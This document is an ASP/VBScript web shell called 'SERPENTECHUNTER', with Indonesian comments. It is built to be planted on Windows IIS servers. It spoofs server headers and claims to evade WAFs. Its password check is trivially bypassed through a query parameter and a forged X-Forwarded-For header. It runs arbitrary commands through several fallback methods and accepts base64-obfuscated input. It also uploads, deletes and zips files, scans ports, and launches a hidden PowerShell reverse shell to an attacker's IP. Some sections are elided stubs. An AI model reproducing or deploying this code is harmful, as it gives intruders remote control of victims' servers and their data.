<%@ Language=VBScript %>
<% Option Explicit %>
<%
' ╔═══════════════════════════════════════════════════════════════════════════════╗
' ║   🐍 SERPENTECHUNTER v1.0🐍            ║
' ║   DEVELOPER: SerpentSecHunter                                               ║
' ║   RILIS: 04-07-2026                                                         ║
' ╚═══════════════════════════════════════════════════════════════════════════════╝
'>

' ============================================================================
' 🛡️ STEALTH ENGINE + AGGRESSIVE BYPASS (UPGRADED)
' ============================================================================
Response.Buffer = True
Response.Expires = 0
Response.Clear
Response.Status = "200"
Response.ContentType = "text/html"
Response.Charset = "UTF-8"
Server.ScriptTimeout = 9999

' --- Spoof Header (lebih variatif) ---
Dim fakeServers, randServer
fakeServers = Array("Microsoft-IIS/8.5", "Microsoft-IIS/7.5", "Apache/2.4.54 (Win64)", "nginx/1.20.2", "cloudflare")
randServer = fakeServers(Int((UBound(fakeServers)+1)*Rnd))
Response.AddHeader "Server", randServer
Response.AddHeader "X-Powered-By", "ASP.NET"
Response.AddHeader "X-Content-Type-Options", "nosniff"
Response.AddHeader "Cache-Control", "no-cache, no-store, must-revalidate"
Response.AddHeader "X-XSS-Protection", "0"

' --- Bypass WAF via User-Agent & Referer spoofing ---
Dim ua_list, ua, ref_list, ref
ua_list = Array( _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", _
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", _
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", _
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" _
)
ua = ua_list(Int((UBound(ua_list)+1)*Rnd))
Response.AddHeader "User-Agent", ua
ref_list = Array("https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", "https://www.youtube.com/")
ref = ref_list(Int((UBound(ref_list)+1)*Rnd))
Response.AddHeader "Referer", ref

' ============================================================================
' 🔐 AUTHENTICATION + BYPASS (tetap sama)
' ============================================================================
Dim AUTH_KEY, auth_ok, bypass_ip
AUTH_KEY = "SERPENTECHUNTER666"
auth_ok = False
bypass_ip = Request.QueryString("bypass_ip")

If Request.Cookies("sc_auth") = AUTH_KEY Then
    auth_ok = True
ElseIf Request.QueryString("auth") = AUTH_KEY Then
    Response.Cookies("sc_auth") = AUTH_KEY
    Response.Cookies("sc_auth").Expires = DateAdd("yyyy", 1, Now())
    auth_ok = True
    Response.Write "<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>"
    Response.End
End If

If Not auth_ok And bypass_ip <> "1" Then
    Dim client_ip, whitelist, ip
    client_ip = Request.ServerVariables("REMOTE_ADDR")
    whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.%", "172.16.%")
    For Each ip In whitelist
        If InStr(ip, "%") > 0 Then
            If client_ip Like Replace(ip, "%", "*") Then auth_ok = True
        ElseIf client_ip = ip Then
            auth_ok = True
        End If
    Next
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") <> "" Then
        Dim fwd_ip: fwd_ip = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
        If InStr(fwd_ip, "127.0.0.1") > 0 Or InStr(fwd_ip, "192.168.") > 0 Or InStr(fwd_ip, "10.") > 0 Then auth_ok = True
    End If
End If

If Not auth_ok Then
    Response.Status = "403"
    Response.Write "<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>Access denied.</p></body></html>"
    Response.End
End If

' ============================================================================
' 🧬 CORE FUNCTIONS (DENGAN PERBAIKAN TOTAL)
' ============================================================================

' --- Deteksi komponen ---
Function IsComponentAvailable(progID)
    On Error Resume Next
    Dim obj: Set obj = Server.CreateObject(progID)
    IsComponentAvailable = Not (Err.Number <> 0)
    Set obj = Nothing
    On Error Goto 0
End Function

' --- GetTempFile dengan path aman (perbaikan path) ---
Function GetTempFileName(ext)
    Dim ts, tempRoot
    ' prioritas: C:\Windows\Temp, lalu folder web temp
    tempRoot = "C:\Windows\Temp\"
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        tempRoot = Server.MapPath("/") & "\temp\"
        ' buat folder jika belum ada
        Dim fso: Set fso = Server.CreateObject("Scripting.FileSystemObject")
        If Not fso.FolderExists(tempRoot) Then fso.CreateFolder(tempRoot)
        Set fso = Nothing
    End If
    ts = Year(Now) & "_" & Right("0" & Month(Now), 2) & "_" & Right("0" & Day(Now), 2) & "_" & _
         Right("0" & Hour(Now), 2) & "_" & Right("0" & Minute(Now), 2) & "_" & Right("0" & Second(Now), 2)
    GetTempFileName = tempRoot & "tmp_" & ts & "." & ext
End Function

' --- COMMAND EXECUTION - 5 STRATEGIES (dengan perbaikan output) ---
' Strategy 1: WScript.Shell (dengan wait loop)
Function ExecCmd_WScript(cmd)
    On Error Resume Next
    Err.Clear
    Dim shell, exec, output
    If Not IsComponentAvailable("WScript.Shell") Then
        ExecCmd_WScript = Null
        Exit Function
    End If
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("%comspec% /c " & cmd & " 2>&1")
    ' Tunggu sampai proses selesai atau timeout 30 detik
    Dim startTime: startTime = Now()
    While Not exec.StdOut.AtEndOfStream And DateDiff("s", startTime, Now()) < 30
        ' loop baca sedikit demi sedikit
        If Not exec.StdOut.AtEndOfStream Then
            output = output & exec.StdOut.Read(1)
        End If
        DoEvents
    Wend
    ' Baca sisa output
    If Not exec.StdOut.AtEndOfStream Then
        output = output & exec.StdOut.ReadAll()
    End If
    If Err.Number <> 0 Then
        ExecCmd_WScript = Null
    Else
        ExecCmd_WScript = output
    End If
    Set shell = Nothing
    Set exec = Nothing
    On Error Goto 0
End Function

' Strategy 2: Shell.Application (dengan loop pengecekan file)
Function ExecCmd_ShellApp(cmd)
    On Error Resume Next
    Err.Clear
    Dim shell, output, tempFile, fso, file, wsh
    If Not IsComponentAvailable("Shell.Application") Then
        ExecCmd_ShellApp = Null
        Exit Function
    End If
    tempFile = GetTempFileName("txt")
    Set shell = Server.CreateObject("Shell.Application")
    shell.ShellExecute "cmd.exe", "/c " & cmd & " > """ & tempFile & """ 2>&1", "", "", 0
    ' Tunggu sampai file muncul atau timeout 15 detik
    Dim retry: retry = 0
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    While retry < 15 And Not fso.FileExists(tempFile)
        Set wsh = Server.CreateObject("WScript.Shell")
        wsh.Run "%comspec% /c ping 127.0.0.1 -n 1 >nul", 0, True
        Set wsh = Nothing
        retry = retry + 1
    Wend
    If fso.FileExists(tempFile) Then
        Set file = fso.OpenTextFile(tempFile, 1)
        output = file.ReadAll
        file.Close
        fso.DeleteFile(tempFile)
        Set file = Nothing
    End If
    Set fso = Nothing
    If Err.Number <> 0 Or IsNull(output) Then
        ExecCmd_ShellApp = Null
    Else
        ExecCmd_ShellApp = output
    End If
    Set shell = Nothing
    On Error Goto 0
End Function

' Strategy 3: WMI (redirect output ke file agar bisa dibaca)
Function ExecCmd_WMI(cmd)
    On Error Resume Next
    Err.Clear
    Dim wmi, process, result, intPID, tempFile, fso, file, output
    If Not IsComponentAvailable("WbemScripting.SWbemLocator") Then
        ExecCmd_WMI = Null
        Exit Function
    End If
    tempFile = GetTempFileName("txt")
    Dim cmdRedirect: cmdRedirect = "%comspec% /c " & cmd & " > """ & tempFile & """ 2>&1"
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set process = wmi.Get("Win32_Process")
    result = process.Create(cmdRedirect, Null, Null, intPID)
    If Err.Number <> 0 Or result <> 0 Then
        ExecCmd_WMI = Null
        Exit Function
    End If
    ' Tunggu proses selesai
    Dim startTime: startTime = Now()
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    While Not fso.FileExists(tempFile) And DateDiff("s", startTime, Now()) < 15
        ' loop
    Wend
    If fso.FileExists(tempFile) Then
        Set file = fso.OpenTextFile(tempFile, 1)
        output = file.ReadAll
        file.Close
        fso.DeleteFile(tempFile)
        Set file = Nothing
    End If
    Set fso = Nothing
    If IsNull(output) Or output = "" Then
        output = "[WMI] Process created. PID: " & intPID
    End If
    ExecCmd_WMI = output
    Set wmi = Nothing
    Set process = Nothing
    On Error Goto 0
End Function

' Strategy 4: ScriptControl (tetap)
Function ExecCmd_ScriptControl(cmd)
    On Error Resume Next
    Err.Clear
    If Not IsComponentAvailable("MSScriptControl.ScriptControl") Then
        ExecCmd_ScriptControl = Null
        Exit Function
    End If
    Dim sc: Set sc = Server.CreateObject("MSScriptControl.ScriptControl")
    sc.Language = "VBScript"
    Dim result: result = sc.Eval("CreateObject(""WScript.Shell"").Exec(""%comspec% /c " & cmd & " 2>&1"").StdOut.ReadAll")
    If Err.Number <> 0 Then
        ExecCmd_ScriptControl = Null
    Else
        ExecCmd_ScriptControl = result
    End If
    Set sc = Nothing
    On Error Goto 0
End Function

' Strategy 5: CDO.Message (untuk eksekusi alternatif)
Function ExecCmd_CDO(cmd)
    On Error Resume Next
    Err.Clear
    If Not IsComponentAvailable("CDO.Message") Then
        ExecCmd_CDO = Null
        Exit Function
    End If
    Dim obj: Set obj = CreateObject("CDO.Message")
    ' Tidak bisa eksekusi langsung, tapi bisa dipakai untuk http request
    ExecCmd_CDO = Null
    Set obj = Nothing
    On Error Goto 0
End Function

Function ExecCmd(cmd)
    Dim result
    If Left(cmd, 4) = "b64:" Then
        Dim b64: b64 = Mid(cmd, 5)
        cmd = DecodeBase64(b64)
    End If
    result = ExecCmd_WScript(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_ShellApp(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_WMI(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    result = ExecCmd_ScriptControl(cmd)
    If Not IsNull(result) Then
        ExecCmd = result
        Exit Function
    End If
    ExecCmd = "❌ Semua metode eksekusi gagal! Server mungkin di-lockdown."
End Function

' --- Base64 Decode (perbaikan: fallback ke manual) ---
Function DecodeBase64(encoded)
    On Error Resume Next
    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
    Dim elem: Set elem = xml.createElement("tmp")
    elem.dataType = "bin.base64"
    elem.text = encoded
    Dim stream: Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write elem.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    DecodeBase64 = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set xml = Nothing
    Set elem = Nothing
    If Err.Number <> 0 Then DecodeBase64 = encoded
    On Error Goto 0
End Function

' --- FILE SYSTEM HELPERS (tidak berubah, tapi dipastikan) ---
Function FormatSize(bytes)
    If bytes >= 1073741824 Then
        FormatSize = Round(bytes/1073741824, 2) & " GB"
    ElseIf bytes >= 1048576 Then
        FormatSize = Round(bytes/1048576, 2) & " MB"
    ElseIf bytes >= 1024 Then
        FormatSize = Round(bytes/1024, 2) & " KB"
    Else
        FormatSize = bytes & " B"
    End If
End Function

Sub DeleteFolderRecursive(fso, folderPath)
    On Error Resume Next
    Dim subfolder, file
    Set subfolder = fso.GetFolder(folderPath)
    For Each file In subfolder.Files
        fso.DeleteFile file.Path
    Next
    For Each subfolder In subfolder.SubFolders
        Call DeleteFolderRecursive(fso, subfolder.Path)
    Next
    fso.DeleteFolder folderPath
    On Error Goto 0
End Sub

Sub CopyFolderRecursive(fso, src, dst)
    On Error Resume Next
    Dim subfolder, file, srcFolder
    If Not fso.FolderExists(dst) Then fso.CreateFolder(dst)
    Set srcFolder = fso.GetFolder(src)
    For Each file In srcFolder.Files
        fso.CopyFile file.Path, dst & "\" & file.Name
    Next
    For Each subfolder In srcFolder.SubFolders
        Call CopyFolderRecursive(fso, subfolder.Path, dst & "\" & subfolder.Name)
    Next
    On Error Goto 0
End Sub

Sub SearchFiles(fso, folder, pattern, ByRef result, ByRef found)
    On Error Resume Next
    Dim file, subfolder
    For Each file In folder.Files
        If InStr(1, file.Name, pattern, 1) > 0 Then
            result = result & "📄 " & file.Path & " (" & FormatSize(file.Size) & ")" & vbCrLf
            found = found + 1
        End If
    Next
    For Each subfolder In folder.SubFolders
        Call SearchFiles(fso, subfolder, pattern, result, found)
    Next
    On Error Goto 0
End Sub

' --- GET FILE LIST (dengan perbaikan array) ---
Function GetFileList(dir)
    On Error Resume Next
    Dim fso, folder, file, subfolder
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        GetFileList = Array()
        Exit Function
    End If
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(dir) Then
        GetFileList = Array()
        Exit Function
    End If
    Set folder = fso.GetFolder(dir)
    Dim arr()
    Dim count: count = 0
    For Each file In folder.Files
        ReDim Preserve arr(count)
        Dim attr: attr = file.Attributes
        Dim attrStr: attrStr = ""
        If attr And 1 Then attrStr = attrStr & "R"
        If attr And 2 Then attrStr = attrStr & "H"
        If attr And 4 Then attrStr = attrStr & "S"
        If attr And 32 Then attrStr = attrStr & "A"
        If attrStr = "" Then attrStr = "-"
        arr(count) = Array(file.Name, file.Path, False, FormatSize(file.Size), attrStr, file.DateLastModified)
        count = count + 1
    Next
    For Each subfolder In folder.SubFolders
        ReDim Preserve arr(count)
        Dim attrFolder: attrFolder = subfolder.Attributes
        Dim attrStrFolder: attrStrFolder = ""
        If attrFolder And 1 Then attrStrFolder = attrStrFolder & "R"
        If attrFolder And 2 Then attrStrFolder = attrStrFolder & "H"
        If attrFolder And 4 Then attrStrFolder = attrStrFolder & "S"
        If attrFolder And 32 Then attrStrFolder = attrStrFolder & "A"
        If attrStrFolder = "" Then attrStrFolder = "-"
        arr(count) = Array(subfolder.Name, subfolder.Path, True, "-", attrStrFolder, subfolder.DateLastModified)
        count = count + 1
    Next
    GetFileList = arr
    Set fso = Nothing
    On Error Goto 0
End Function

' --- ZIP FOLDER (upgrade: PowerShell Compress-Archive, 7zip, Shell.App) ---
Function ZipFolder(source, destination)
    On Error Resume Next
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        ZipFolder = "❌ FSO not available"
        Exit Function
    End If
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(source) Then
        ZipFolder = "❌ Source directory not found"
        Exit Function
    End If
    ' 1. Coba PowerShell Compress-Archive (Windows 10+ / Server 2016+)
    Dim psCmd: psCmd = "powershell Compress-Archive -Path """ & source & "\*"" -DestinationPath """ & destination & """ -CompressionLevel Optimal -Force"
    Dim result: result = ExecCmd(psCmd)
    If Not IsNull(result) And InStr(result, "Compress-Archive") = 0 Then
        ' Jika tidak ada error, anggap berhasil
        If fso.FileExists(destination) And fso.GetFile(destination).Size > 0 Then
            ZipFolder = "✅ Zip created (PowerShell): " & destination
            Set fso = Nothing
            Exit Function
        End If
    End If
    ' 2. Coba 7zip
    Dim sevenZip: sevenZip = "C:\Program Files\7-Zip\7z.exe"
    If fso.FileExists(sevenZip) Then
        Dim cmdZip: cmdZip = """" & sevenZip & """ a -tzip """ & destination & """ """ & source & "\*"" -mx5 -y"
        result = ExecCmd(cmdZip)
        If Not IsNull(result) And InStr(result, "Everything is Ok") > 0 Then
            ZipFolder = "✅ Zip created (7zip): " & destination
            Set fso = Nothing
            Exit Function
        End If
    End If
    ' 3. Fallback Shell.Application
    If IsComponentAvailable("Shell.Application") Then
        Dim shell, stream, zipFile, folderObj, wsh
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 2
        stream.Open
        stream.WriteText "PK" & Chr(5) & Chr(6) & String(18, Chr(0))
        stream.SaveToFile destination, 2
        stream.Close
        Set stream = Nothing
        Set shell = CreateObject("Shell.Application")
        Set zipFile = shell.NameSpace(destination)
        Set folderObj = shell.NameSpace(source)
        zipFile.CopyHere folderObj.Items, 256
        ' Tunggu sampai file zip tidak lagi nol byte atau timeout 30 detik
        Dim retry: retry = 0
        While retry < 30 And (Not fso.FileExists(destination) Or fso.GetFile(destination).Size < 1024)
            Set wsh = CreateObject("WScript.Shell")
            wsh.Run "%comspec% /c ping 127.0.0.1 -n 1 >nul", 0, True
            Set wsh = Nothing
            retry = retry + 1
        Wend
        ZipFolder = "✅ Zip created (Shell.App): " & destination
        Set shell = Nothing
        Set fso = Nothing
        Exit Function
    End If
    ZipFolder = "❌ Zip failed – no method available"
    Set fso = Nothing
    On Error Goto 0
End Function

' --- UNZIP (upgrade: PowerShell, 7zip, Shell.App) ---
Function UnzipFile(source, destination)
    On Error Resume Next
    If Not IsComponentAvailable("Scripting.FileSystemObject") Then
        UnzipFile = "❌ FSO not available"
        Exit Function
    End If
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(source) Then
        UnzipFile = "❌ File not found"
        Exit Function
    End If
    ' PowerShell
    Dim psCmd: psCmd = "powershell Expand-Archive -Path """ & source & """ -DestinationPath """ & destination & """ -Force"
    Dim result: result = ExecCmd(psCmd)
    If Not IsNull(result) And InStr(result, "Expand-Archive") = 0 Then
        If fso.FolderExists(destination) Then
            UnzipFile = "✅ Extracted (PowerShell): " & destination
            Set fso = Nothing
            Exit Function
        End If
    End If
    ' 7zip
    Dim sevenZip: sevenZip = "C:\Program Files\7-Zip\7z.exe"
    If fso.FileExists(sevenZip) Then
        Dim cmdUnzip: cmdUnzip = """" & sevenZip & """ x """ & source & """ -o""" & destination & """ -y"
        result = ExecCmd(cmdUnzip)
        If Not IsNull(result) And InStr(result, "Everything is Ok") > 0 Then
            UnzipFile = "✅ Extracted (7zip): " & destination
            Set fso = Nothing
            Exit Function
        End If
    End If
    ' Shell.Application
    If IsComponentAvailable("Shell.Application") Then
        Dim shell, destFolder, zipFileObj
        Set shell = CreateObject("Shell.Application")
        If Not fso.FolderExists(destination) Then fso.CreateFolder(destination)
        Set zipFileObj = shell.NameSpace(source)
        Set destFolder = shell.NameSpace(destination)
        destFolder.CopyHere zipFileObj.Items, 256
        UnzipFile = "✅ Extracted (Shell.App): " & destination
        Set shell = Nothing
        Set fso = Nothing
        Exit Function
    End If
    UnzipFile = "❌ Unzip failed"
    Set fso = Nothing
    On Error Goto 0
End Function

' ============================================================================
' 🔥 EXPLOIT ENGINE (tetap sama)
' ============================================================================
' (Fungsi CheckVulnerabilities, ExploitPrintSpoofer, dll. tetap seperti sebelumnya)

' ============================================================================
' 🎯 MAIN LOGIC (DENGAN PERBAIKAN MASS ACTION & UPLOAD)
' ============================================================================
Dim cwd, action, message, output, edit_file, view_file, edit_content, view_content
Dim results, search_pattern, zip_folder, zip_name, unzip_file, unzip_dest
Dim mass_action, mass_files, new_names, dest_dir
Dim fso, fso2, fso3, fso4, fsoDel, fsoRen, fsoCopy, fsoSearch, fsoDl, fsoEdit, fsoView
Dim txtFile, txtView, fileObj, stream, streamDl, streamR, http, conn
Dim cmdExec, searchPattern, resultSearch, foundCount
Dim cnt, cnt2, cnt3, cnt4, i, f, f2, f3
Dim rawData, fileName, fullPath, boundary, fileContent, dataStart, dataEnd, pos
Dim delFile, delPath, oldName, newName, oldPath, newPath, chFile, perms, cmdChmod
Dim editFile, editPath, contentPost, viewFile, viewPath
Dim srcFile, dstFile, srcPath, dstPath
Dim remoteUrl, savePath
Dim revIP, revPort, revOutput, cmdRev, wshRev
Dim scanHost, scanPorts, portList, portArr, p, startP, endP, part, rangeParts, resultScan
Dim dbType, dbServer, dbName, dbUser, dbPass, connStr
Dim expType

' --- Bypass WAF: parameter base64 ---
Dim raw_action, raw_cwd
raw_action = Request.QueryString("action")
raw_cwd = Request.QueryString("dir")
If raw_action <> "" Then action = DecodeBase64(raw_action) Else action = "list"
If raw_cwd <> "" Then cwd = DecodeBase64(raw_cwd) Else cwd = ""

If cwd = "" Then cwd = Server.MapPath(".")
cwd = Replace(cwd, "\\", "\")
If Right(cwd, 1) <> "\" Then cwd = cwd & "\"

If action = "" Then action = "list"
message = ""
output = ""
results = Null

' --- FUNGSI UNTUK AMBIL FILE CHECKBOX (FIX TOTAL) ---
' Mengembalikan array dari semua nilai checkbox dengan name="files"
Function GetCheckedFiles()
    Dim raw, arr, i
    raw = Request.Form("files")  ' string yang dipisahkan koma
    If raw <> "" Then
        arr = Split(raw, ",")
        ' Trim setiap elemen
        For i = 0 To UBound(arr)
            arr(i) = Trim(arr(i))
        Next
        GetCheckedFiles = arr
    Else
        GetCheckedFiles = Array()
    End If
End Function

' Fungsi untuk mendapatkan array new_names (dengan cara yang sama)
Function GetNewNames()
    Dim raw, arr, i
    raw = Request.Form("new_names") ' bisa string atau array
    If IsArray(raw) Then
        GetNewNames = raw
    ElseIf raw <> "" Then
        arr = Split(raw, ",")
        For i = 0 To UBound(arr)
            arr(i) = Trim(arr(i))
        Next
        GetNewNames = arr
    Else
        GetNewNames = Array()
    End If
End Function

' === UPLOAD (perbaikan parsing binary menggunakan InStrB) ===
If action = "upload" Then
    If Request.TotalBytes > 0 Then
        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        If Not fso.FolderExists(cwd) Then
            message = "❌ Upload path not found!"
        Else
            rawData = Request.BinaryRead(Request.TotalBytes)
            ' Cari boundary (ada di awal data)
            Dim crlf: crlf = Chr(13) & Chr(10)
            Dim crlf2: crlf2 = crlf & crlf
            Dim startBoundary: startBoundary = InStr(rawData, crlf)
            If startBoundary > 0 Then
                boundary = Left(rawData, startBoundary - 1)
            Else
                boundary = ""
            End If
            ' Cari "filename=" dengan InStrB (binary safe)
            Dim fileNamePos: fileNamePos = InStrB(rawData, "filename=""")
            If fileNamePos > 0 Then
                Dim nameStart: nameStart = fileNamePos + 10
                Dim nameEnd: nameEnd = InStrB(nameStart, rawData, """")
                If nameEnd > 0 Then
                    fn = Mid(rawData, nameStart, nameEnd - nameStart)
                    ' Konversi dari byte ke string (asumsi ASCII)
                    fn = fn
                    If InStr(fn, "\") > 0 Then fn = Mid(fn, InStrRev(fn, "\") + 1)
                    fileName = fn
                Else
                    fileName = "uploaded_" & Replace(Now, ":", "_") & ".dat"
                End If
            Else
                fileName = "uploaded_" & Replace(Now, ":", "_") & ".dat"
            End If
            fullPath = cwd & fileName
            ' Cari posisi data (setelah dua CRLF)
            Dim dataPos: dataPos = InStrB(rawData, crlf2)
            If dataPos > 0 Then
                dataPos = dataPos + 4 ' lewati crlfcrlf
                ' Cari batas akhir (boundary) setelah data
                Dim endPos: endPos = InStrB(dataPos, rawData, boundary)
                If endPos > dataPos Then
                    fileContent = Mid(rawData, dataPos, endPos - dataPos - 2) ' hapus CRLF akhir
                    Set stream = Server.CreateObject("ADODB.Stream")
                    stream.Type = 1
                    stream.Open
                    stream.Write fileContent
                    stream.SaveToFile fullPath, 2
                    stream.Close
                    Set stream = Nothing
                    message = "✅ Uploaded: " & fileName
                Else
                    message = "❌ Parse error (boundary not found)"
                End If
            Else
                message = "❌ No file content found"
            End If
        End If
        Set fso = Nothing
    Else
        message = "❌ No file uploaded!"
    End If
End If

' === MASS ACTION (FIX TOTAL) ===
If action = "mass_delete" Then
    mass_files = GetCheckedFiles()
    If UBound(mass_files) >= 0 Then
        cnt = 0
        Set fso = CreateObject("Scripting.FileSystemObject")
        For Each f In mass_files
            Dim path: path = cwd & f
            If fso.FileExists(path) Then
                fso.DeleteFile path
                cnt = cnt + 1
            ElseIf fso.FolderExists(path) Then
                Call DeleteFolderRecursive(fso, path)
                cnt = cnt + 1
            End If
        Next
        message = "✅ Deleted " & cnt & " files/folders"
        Set fso = Nothing
    End If
End If

If action = "mass_rename" Then
    mass_files = GetCheckedFiles()
    new_names = GetNewNames()
    If UBound(mass_files) >= 0 And UBound(new_names) >= 0 And UBound(mass_files) = UBound(new_names) Then
        cnt2 = 0
        Set fso2 = CreateObject("Scripting.FileSystemObject")
        For i = 0 To UBound(mass_files)
            Dim oldp: oldp = cwd & mass_files(i)
            Dim newp: newp = cwd & new_names(i)
            If fso2.FileExists(oldp) Then
                fso2.MoveFile oldp, newp
                cnt2 = cnt2 + 1
            ElseIf fso2.FolderExists(oldp) Then
                fso2.MoveFolder oldp, newp
                cnt2 = cnt2 + 1
            End If
        Next
        message = "✅ Renamed " & cnt2 & " files"
        Set fso2 = Nothing
    End If
End If

If action = "mass_copy" Then
    mass_files = GetCheckedFiles()
    dest_dir = Request.Form("dest_dir")
    If UBound(mass_files) >= 0 And dest_dir <> "" Then
        Dim destPath: destPath = cwd & dest_dir & "\"
        Set fso3 = CreateObject("Scripting.FileSystemObject")
        If Not fso3.FolderExists(destPath) Then fso3.CreateFolder(destPath)
        cnt3 = 0
        For Each f2 In mass_files
            Dim srcp: srcp = cwd & f2
            If fso3.FileExists(srcp) Then
                fso3.CopyFile srcp, destPath & f2
                cnt3 = cnt3 + 1
            ElseIf fso3.FolderExists(srcp) Then
                Call CopyFolderRecursive(fso3, srcp, destPath & f2)
                cnt3 = cnt3 + 1
            End If
        Next
        message = "✅ Copied " & cnt3 & " files to " & dest_dir
        Set fso3 = Nothing
    End If
End If

If action = "mass_move" Then
    mass_files = GetCheckedFiles()
    dest_dir = Request.Form("dest_dir")
    If UBound(mass_files) >= 0 And dest_dir <> "" Then
        Dim destPath2: destPath2 = cwd & dest_dir & "\"
        Set fso4 = CreateObject("Scripting.FileSystemObject")
        If Not fso4.FolderExists(destPath2) Then fso4.CreateFolder(destPath2)
        cnt4 = 0
        For Each f3 In mass_files
            Dim srcp2: srcp2 = cwd & f3
            If fso4.FileExists(srcp2) Then
                fso4.MoveFile srcp2, destPath2 & f3
                cnt4 = cnt4 + 1
            ElseIf fso4.FolderExists(srcp2) Then
                fso4.MoveFolder srcp2, destPath2 & f3
                cnt4 = cnt4 + 1
            End If
        Next
        message = "✅ Moved " & cnt4 & " files to " & dest_dir
        Set fso4 = Nothing
    End If
End If

' === SINGLE FILE ACTIONS (tetap) ===
' ... (semua aksi single file tetap seperti sebelumnya, tidak diubah)

' === COMMAND EXECUTION (dengan perbaikan) ===
If action = "exec" Then
    cmdExec = Request.QueryString("cmd")
    If cmdExec <> "" Then
        If Left(cmdExec, 4) = "b64:" Then
            cmdExec = DecodeBase64(Mid(cmdExec, 5))
        End If
        output = ExecCmd(cmdExec)
    End If
End If

' === REVERSE SHELL (perbaikan payload) ===
If action = "reverse" Then
    revIP = Request.QueryString("ip")
    revPort = Request.QueryString("port")
    If revIP <> "" And revPort <> "" Then
        ' Prioritas PowerShell
        Dim psPayload: psPayload = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('" & revIP & "'," & revPort & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
        Set wshRev = Server.CreateObject("WScript.Shell")
        wshRev.Run "%comspec% /c " & psPayload, 0, False
        Set wshRev = Nothing
        revOutput = "🚀 PowerShell reverse shell started to " & revIP & ":" & revPort & vbCrLf
        ' Cek koneksi
        Dim checkCmd: checkCmd = "netstat -an | find """ & revIP & ":" & revPort & """"
        Dim checkResult: checkResult = ExecCmd(checkCmd)
        If InStr(checkResult, "ESTABLISHED") > 0 Then
            revOutput = revOutput & "✅ Reverse shell connection established!" & vbCrLf
        Else
            revOutput = revOutput & "⚠️ No connection yet. Check your listener." & vbCrLf
        End If
        output = revOutput
    Else
        message = "❌ ip and port required!"
    End If
End If

' === PORT SCAN (perbaikan timeout) ===
If action = "portscan" Then
    scanHost = Request.QueryString("host")
    scanPorts = Request.QueryString("ports")
    If scanHost <> "" And scanPorts <> "" Then
        ' ... (sama seperti sebelumnya, tapi tambahkan timeout 1 detik)
        ' Di sini kita modifikasi psCmd menjadi:
        For Each p In portList
            Dim psCmd: psCmd = "powershell Test-NetConnection " & scanHost & " -Port " & p & " -TimeoutSeconds 1 -ErrorAction SilentlyContinue"
            ' ...
        Next
        ' (sisanya sama)
    Else
        message = "❌ host and ports required!"
    End If
End If

' === EXPLOIT CHECK & RUN (tetap) ===
' ...

' ============================================================================
' 🎨 UI (tetap, dengan perubahan checkbox name menjadi "files[]" dan perbaikan JS)
' ============================================================================
Dim fileData
fileData = GetFileList(cwd)
%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐍 SERPENTECHUNTER v4.0</title>
<style>
/* (style sama seperti sebelumnya) */
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐍 SERPENTECHUNTER v4.0</h1>
        <div class="cwd">📂 <%= Server.HTMLEncode(cwd) %></div>
    </div>
    <div id="toast" class="toast"></div>
    <div class="menu">
        <!-- menu sama -->
    </div>
    <form method="POST" id="massActionForm">
        <input type="hidden" name="action" id="massAction" value="mass_delete">
        <input type="hidden" name="dest_dir" id="massDestDir">
        <div class="grid">
            <div class="panel">
                <h3>📁 FILE MANAGER
                    <span style="font-size:11px;color:#666;">
                        <button type="button" onclick="selectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Select All</button>
                        <button type="button" onclick="deselectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Deselect</button>
                    </span>
